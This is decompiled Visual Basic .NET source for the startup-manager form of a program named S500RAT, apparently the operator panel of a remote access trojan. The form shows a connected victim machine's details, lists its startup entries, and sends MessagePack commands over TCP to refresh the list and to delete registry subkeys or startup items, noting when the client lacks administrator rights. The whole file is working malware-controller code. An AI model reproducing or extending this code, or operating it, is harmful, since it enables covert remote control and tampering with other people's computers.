Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Gry.Helper
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000034 RID: 52
	<DesignerGenerated()>
	Public Partial Class FormStartup
		Inherits Form

		' Token: 0x06000ED6 RID: 3798 RVA: 0x000831C7 File Offset: 0x000813C7
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormStartup_Load
			AddHandler MyBase.Resize, AddressOf Me.FormStartup_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x1700060E RID: 1550
		' (get) Token: 0x06000ED9 RID: 3801 RVA: 0x00083F2C File Offset: 0x0008212C
		' (set) Token: 0x06000EDA RID: 3802 RVA: 0x00083F36 File Offset: 0x00082136
		Friend Overridable Property L1 As AeroListView

		' Token: 0x1700060F RID: 1551
		' (get) Token: 0x06000EDB RID: 3803 RVA: 0x00083F3F File Offset: 0x0008213F
		' (set) Token: 0x06000EDC RID: 3804 RVA: 0x00083F49 File Offset: 0x00082149
		Friend Overridable Property Cnames As ColumnHeader

		' Token: 0x17000610 RID: 1552
		' (get) Token: 0x06000EDD RID: 3805 RVA: 0x00083F52 File Offset: 0x00082152
		' (set) Token: 0x06000EDE RID: 3806 RVA: 0x00083F5C File Offset: 0x0008215C
		Friend Overridable Property CDiscription As ColumnHeader

		' Token: 0x17000611 RID: 1553
		' (get) Token: 0x06000EDF RID: 3807 RVA: 0x00083F65 File Offset: 0x00082165
		' (set) Token: 0x06000EE0 RID: 3808 RVA: 0x00083F70 File Offset: 0x00082170
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000612 RID: 1554
		' (get) Token: 0x06000EE1 RID: 3809 RVA: 0x00083FB3 File Offset: 0x000821B3
		' (set) Token: 0x06000EE2 RID: 3810 RVA: 0x00083FBD File Offset: 0x000821BD
		Friend Overridable Property Guna2Elipse1 As Guna2Elipse

		' Token: 0x17000613 RID: 1555
		' (get) Token: 0x06000EE3 RID: 3811 RVA: 0x00083FC6 File Offset: 0x000821C6
		' (set) Token: 0x06000EE4 RID: 3812 RVA: 0x00083FD0 File Offset: 0x000821D0
		Friend Overridable Property ControllContextMenuStrip As ContextMenuStrip

		' Token: 0x17000614 RID: 1556
		' (get) Token: 0x06000EE5 RID: 3813 RVA: 0x00083FD9 File Offset: 0x000821D9
		' (set) Token: 0x06000EE6 RID: 3814 RVA: 0x00083FE4 File Offset: 0x000821E4
		Friend Overridable Property RefreshList As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshList
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshList_Click
				Dim refreshList As ToolStripMenuItem = Me._RefreshList
				If refreshList IsNot Nothing Then
					RemoveHandler refreshList.Click, value2
				End If
				Me._RefreshList = value
				refreshList = Me._RefreshList
				If refreshList IsNot Nothing Then
					AddHandler refreshList.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000615 RID: 1557
		' (get) Token: 0x06000EE7 RID: 3815 RVA: 0x00084027 File Offset: 0x00082227
		' (set) Token: 0x06000EE8 RID: 3816 RVA: 0x00084034 File Offset: 0x00082234
		Friend Overridable Property PathDelete As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._PathDelete
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PathDelete_Click
				Dim pathDelete As ToolStripMenuItem = Me._PathDelete
				If pathDelete IsNot Nothing Then
					RemoveHandler pathDelete.Click, value2
				End If
				Me._PathDelete = value
				pathDelete = Me._PathDelete
				If pathDelete IsNot Nothing Then
					AddHandler pathDelete.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000616 RID: 1558
		' (get) Token: 0x06000EE9 RID: 3817 RVA: 0x00084077 File Offset: 0x00082277
		' (set) Token: 0x06000EEA RID: 3818 RVA: 0x00084081 File Offset: 0x00082281
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000617 RID: 1559
		' (get) Token: 0x06000EEB RID: 3819 RVA: 0x0008408A File Offset: 0x0008228A
		' (set) Token: 0x06000EEC RID: 3820 RVA: 0x00084094 File Offset: 0x00082294
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000618 RID: 1560
		' (get) Token: 0x06000EED RID: 3821 RVA: 0x0008409D File Offset: 0x0008229D
		' (set) Token: 0x06000EEE RID: 3822 RVA: 0x000840A7 File Offset: 0x000822A7
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x17000619 RID: 1561
		' (get) Token: 0x06000EEF RID: 3823 RVA: 0x000840B0 File Offset: 0x000822B0
		' (set) Token: 0x06000EF0 RID: 3824 RVA: 0x000840BA File Offset: 0x000822BA
		Friend Overridable Property IM As ImageList

		' Token: 0x1700061A RID: 1562
		' (get) Token: 0x06000EF1 RID: 3825 RVA: 0x000840C3 File Offset: 0x000822C3
		' (set) Token: 0x06000EF2 RID: 3826 RVA: 0x000840CD File Offset: 0x000822CD
		Public Overridable Property StartupNum As Label

		' Token: 0x1700061B RID: 1563
		' (get) Token: 0x06000EF3 RID: 3827 RVA: 0x000840D6 File Offset: 0x000822D6
		' (set) Token: 0x06000EF4 RID: 3828 RVA: 0x000840E0 File Offset: 0x000822E0
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x1700061C RID: 1564
		' (get) Token: 0x06000EF5 RID: 3829 RVA: 0x000840E9 File Offset: 0x000822E9
		' (set) Token: 0x06000EF6 RID: 3830 RVA: 0x000840F3 File Offset: 0x000822F3
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x1700061D RID: 1565
		' (get) Token: 0x06000EF7 RID: 3831 RVA: 0x000840FC File Offset: 0x000822FC
		' (set) Token: 0x06000EF8 RID: 3832 RVA: 0x00084108 File Offset: 0x00082308
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700061E RID: 1566
		' (get) Token: 0x06000EF9 RID: 3833 RVA: 0x0008414B File Offset: 0x0008234B
		' (set) Token: 0x06000EFA RID: 3834 RVA: 0x00084155 File Offset: 0x00082355
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x1700061F RID: 1567
		' (get) Token: 0x06000EFB RID: 3835 RVA: 0x0008415E File Offset: 0x0008235E
		' (set) Token: 0x06000EFC RID: 3836 RVA: 0x00084168 File Offset: 0x00082368
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000620 RID: 1568
		' (get) Token: 0x06000EFD RID: 3837 RVA: 0x00084171 File Offset: 0x00082371
		' (set) Token: 0x06000EFE RID: 3838 RVA: 0x0008417B File Offset: 0x0008237B
		Public Property Client As Clients

		' Token: 0x17000621 RID: 1569
		' (get) Token: 0x06000EFF RID: 3839 RVA: 0x00084184 File Offset: 0x00082384
		' (set) Token: 0x06000F00 RID: 3840 RVA: 0x0008418E File Offset: 0x0008238E
		Public Property F As FormS500

		' Token: 0x17000622 RID: 1570
		' (get) Token: 0x06000F01 RID: 3841 RVA: 0x00084197 File Offset: 0x00082397
		' (set) Token: 0x06000F02 RID: 3842 RVA: 0x000841A1 File Offset: 0x000823A1
		Public Property FullPath As String

		' Token: 0x17000623 RID: 1571
		' (get) Token: 0x06000F03 RID: 3843 RVA: 0x000841AA File Offset: 0x000823AA
		' (set) Token: 0x06000F04 RID: 3844 RVA: 0x000841B4 File Offset: 0x000823B4
		Friend Property ParentClient As Clients

		' Token: 0x06000F05 RID: 3845 RVA: 0x000841C0 File Offset: 0x000823C0
		Private Sub FormStartup_Load(sender As Object, e As EventArgs)
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.MinimumSize = MyBase.Size
			Me.FormSize = True
		End Sub

		' Token: 0x06000F06 RID: 3846 RVA: 0x000842A8 File Offset: 0x000824A8
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x06000F07 RID: 3847 RVA: 0x00084314 File Offset: 0x00082514
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x06000F08 RID: 3848 RVA: 0x0008432C File Offset: 0x0008252C
		Private Sub FormStartup_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x06000F09 RID: 3849 RVA: 0x000843C0 File Offset: 0x000825C0
		Private Sub PathDelete_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedItems
					Dim objectValue As Object = RuntimeHelpers.GetObjectValue(obj)
					Dim flag As Boolean = Me.L1.SelectedItems(0).ImageIndex = 0
					If flag Then
						Dim flag2 As Boolean = Me.L1.SelectedItems(0).Group.Header.StartsWith("HKEY_LOCAL_MACHINE")
						If flag2 Then
							Dim flag3 As Boolean = Not Me.Admin
							If flag3 Then
								MessageBox.Show("The client is not running as an administrator so you can't delete!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
								Exit For
							End If
						End If
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "DeleteSubKey"
						msgPack.ForcePathObject("SubKey").AsString = Me.L1.SelectedItems(0).Group.Header + "\".ToString()
						msgPack.ForcePathObject("ValueName").AsString = Me.L1.SelectedItems(0).Text.ToString()
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Else
						Dim msgPack2 As MsgPack = New MsgPack()
						msgPack2.ForcePathObject("Packet").AsString = "DeleteStartup"
						msgPack2.ForcePathObject("StartupName").AsString = Me.L1.SelectedItems(0).Text.ToString()
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x06000F0A RID: 3850 RVA: 0x000845B8 File Offset: 0x000827B8
		Private Sub RefreshList_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "List"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x040006BE RID: 1726
		Public Admin As Boolean

		' Token: 0x040006BF RID: 1727
		Private FormSize As Boolean
	End Class
End Namespace
